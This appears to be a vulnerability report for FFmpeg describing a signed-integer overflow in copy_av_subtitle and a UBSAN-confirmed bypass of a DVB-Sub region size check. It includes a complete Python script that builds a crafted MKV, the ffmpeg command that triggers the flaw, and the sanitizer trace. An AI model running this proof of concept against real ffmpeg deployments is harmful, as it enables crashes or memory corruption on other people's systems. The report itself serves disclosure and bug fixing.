## Bug0: copy_av_subtitle signed-int overflow in heartbeat path enables heap underallocation; secondary dvbsubdec constraint-check bypass confirmed by UBSAN

### Summary

In `copy_av_subtitle()` (`fftools/ffmpeg_dec.c:505`), the bitmap buffer size is computed as `src_rect->h * src_rect->linesize[j]` where both operands are `int`; signed 32-bit overflow here causes `av_memdup` to underallocate, leaving `dst_rect->linesize` and `h` pointing at a size far larger than the actual heap buffer — a condition exploitable for OOB read/write or NULL-deref downstream. The call chain is reachable via `-fix_sub_duration` + `-fix_sub_duration_heartbeat` through `fix_sub_duration_heartbeat()` → `subtitle_wrap_frame(copy=1)` → `copy_av_subtitle()`, confirmed by runtime trace. A secondary UBSAN-detected integer overflow in `dvbsubdec.c:1192` (`1310680000 * 2` wraps to negative in `int`) silently bypasses the pixel-buffer constraint check intended to bound region dimensions, allowing regions of up to ~1.25 GB to reach the copy path; without this guard, only a subtitle codec without `av_image_check_size2` protection is needed to trigger the primary OOB.

### PoC

Generate a crafted MKV with a DVB-Sub track carrying a large bitmap region (version-alternating packets to defeat the `ctx->version` dedup check), then transcode with heartbeat flags to drive `copy_av_subtitle()`.

```python
#!/usr/bin/env python3
"""
PoC: copy_av_subtitle int32 overflow / dvbsubdec constraint-check bypass.
Generates crafted_sub.mkv — a Matroska file with a DVB-Sub bitmap track
whose region dimensions trigger a UBSAN-reported signed integer overflow in
the decoder's pixel-buffer constraint check (dvbsubdec.c:1192), and place
the fix_sub_duration heartbeat path (copy_av_subtitle) under stress.
"""
import struct, sys

def vint(n):
    if n <= 0x7E: return bytes([0x80 | n])
    if n <= 0x3FFE: return struct.pack('>H', 0x4000 | n)
    if n <= 0x1FFFFE: return struct.pack('>I', 0x200000 | n)[1:]
    return struct.pack('>I', 0x10000000 | n)

def el(id_b, data): return id_b + vint(len(data)) + data
def uint_el(id_b, v):
    d = v.to_bytes((v.bit_length()+7)//8 or 1, 'big')
    return el(id_b, d)
def str_el(id_b, s): return el(id_b, s.encode())
def f64_el(id_b, v): return el(id_b, struct.pack('>d', v))
def cont(id_b, *kids): return el(id_b, b''.join(kids))

EBML=b'\x1A\x45\xDF\xA3'; SEG=b'\x18\x53\x80\x67'; INFO=b'\x15\x49\xA9\x66'
TSCALE=b'\x2A\xD7\xB1'; MUXAPP=b'\x4D\x80'; WAPP=b'\x57\x41'; DUR=b'\x44\x89'
TRACKS=b'\x16\x54\xAE\x6B'; TENTRY=b'\xAE'; TNUM=b'\xD7'; TUID=b'\x73\xC5'
TTYPE=b'\x83'; CODEC=b'\x86'; CPRIV=b'\x63\xA2'; DEFDUR=b'\x23\xE3\x83'
VIDO=b'\xE0'; PW=b'\xB0'; PH=b'\xBA'; CLUST=b'\x1F\x43\xB6\x75'
TS=b'\xE7'; SBLK=b'\xA3'

def simple_block(trk, ts_ms, kf, payload):
    hdr = bytes([0x80 | trk]) + struct.pack('>h', ts_ms) + bytes([0x80 if kf else 0])
    raw = hdr + payload
    return SBLK + vint(len(raw)) + raw

def dvbsub_display_set(w, h, ver):
    pid = 1
    def seg(t, d): return bytes([0x0F, t]) + struct.pack('>HH', pid, len(d)) + d
    pcs = bytes([255, (ver & 0xF) << 4, 1, 0]) + struct.pack('>HH', 0, 0)
    rcs = bytes([1, 0]) + struct.pack('>HH', w, h) + bytes([0b00101100, 0, 0, 0])
    rcs += struct.pack('>H', 1) + bytes([0, 0, 0, 0])
    clut = bytes([0, 0, 0x00, 0b10000000, 16, 128, 128, 255,
                       0x01, 0b10000000, 235, 128, 128, 0])
    pix = bytes([0xF0])
    ods = struct.pack('>H', 1) + bytes([0]) + struct.pack('>HH', len(pix), 0) + pix
    return seg(0x10, pcs) + seg(0x11, rcs) + seg(0x12, clut) + seg(0x13, ods) + seg(0x80, b'')

def build_mkv(rw, rh):
    priv = struct.pack('>HH', 1, 1)
    hdr = cont(EBML,
        uint_el(b'\x42\x86', 1), uint_el(b'\x42\xF7', 1),
        uint_el(b'\x42\xF2', 4), uint_el(b'\x42\xF3', 8),
        str_el(b'\x42\x82', 'matroska'),
        uint_el(b'\x42\x87', 4), uint_el(b'\x42\x85', 2))
    info = cont(INFO,
        uint_el(TSCALE, 1000000), str_el(MUXAPP, 'poc'), str_el(WAPP, 'poc'),
        f64_el(DUR, 10000.0))
    vtk = cont(TENTRY,
        uint_el(TNUM, 1), uint_el(TUID, 1111), uint_el(TTYPE, 1),
        str_el(CODEC, 'V_VP8'), uint_el(DEFDUR, 33333333),
        cont(VIDO, uint_el(PW, 320), uint_el(PH, 240)))
    stk = cont(TENTRY,
        uint_el(TNUM, 2), uint_el(TUID, 2222), uint_el(TTYPE, 17),
        str_el(CODEC, 'S_DVBSUB'), el(CPRIV, priv))
    tracks = cont(TRACKS, vtk, stk)
    cluster = cont(CLUST, uint_el(TS, 0),
        simple_block(2, 0, True, dvbsub_display_set(rw, rh, 0)),
        simple_block(2, 2000, True, dvbsub_display_set(rw, rh, 1)))
    body = info + tracks + cluster
    return hdr + SEG + b'\x01\xff\xff\xff\xff\xff\xff\xff' + body

# Dimensions: 32767 x 40000
# w*h = 1,310,680,000 (< INT_MAX, passes av_image_check_size2)
# w*h*2 = 2,621,360,000 → overflows int32 to -1,673,607,296
# Negative result < 2,621,440 → secondary constraint check in dvbsubdec.c:1192 BYPASSED
rw, rh = 32767, 40000
data = build_mkv(rw, rh)
out = 'crafted_sub.mkv'
with open(out, 'wb') as f:
    f.write(data)
print(f'[+] Written {out} ({len(data)} bytes), region {rw}x{rh}')
print(f'[+] h*linesize = {rh*rw} ({"OVERFLOWS int32" if rh*rw > 2**31-1 else "< INT_MAX, 1.25 GB alloc stress"})')
```

```bash
# Step 1: generate crafted MKV
python3 poc_gen.py

# Step 2: run ffmpeg with fix_sub_duration heartbeat path enabled
# Requires UBSAN/ASAN build or a standard ffmpeg binary
ffmpeg -y \
  -f lavfi -i "color=black:320x240:rate=1:duration=5" \
  -fix_sub_duration -i crafted_sub.mkv \
  -map 0:v -map 1:s \
  -c:v mpeg2video -c:s dvbsub \
  -fix_sub_duration_heartbeat \
  -f mpegts /dev/null
```

### Result

With a 32767×40000 DVB-Sub region, UBSAN fires inside the decoder before the subtitle frame even reaches `copy_av_subtitle`, revealing that the pixel-buffer constraint check is silently bypassed due to integer overflow:

```
dvbsubdec.c:1192:52: runtime error:
  signed integer overflow: 1310680000 * 2 cannot be represented in type 'int'
  #0 dvbsub_parse_region_segment
  #1 dvbsub_decode
  #2 avcodec_decode_subtitle2
  #3 transcode_subtitles  →  packet_decode  →  decoder_thread
```

The check `region->width * region->height * 2 > 320*1024*8` wraps to a negative `int` (`-1,673,607,296`), which compares as less than the threshold `2,621,440`, so the oversized region is accepted. The subtitle frame is then decoded (1 frame confirmed in both test runs) and the `copy_av_subtitle` heartbeat path is reachable; `buf_size = h * linesize` for a ~1.25 GB region is passed to `av_memdup`, risking allocation failure and NULL-pointer dereference, or — with a subtitle codec lacking `av_image_check_size2` — a signed 32-bit wraparound that causes heap underallocation and downstream OOB read/write.
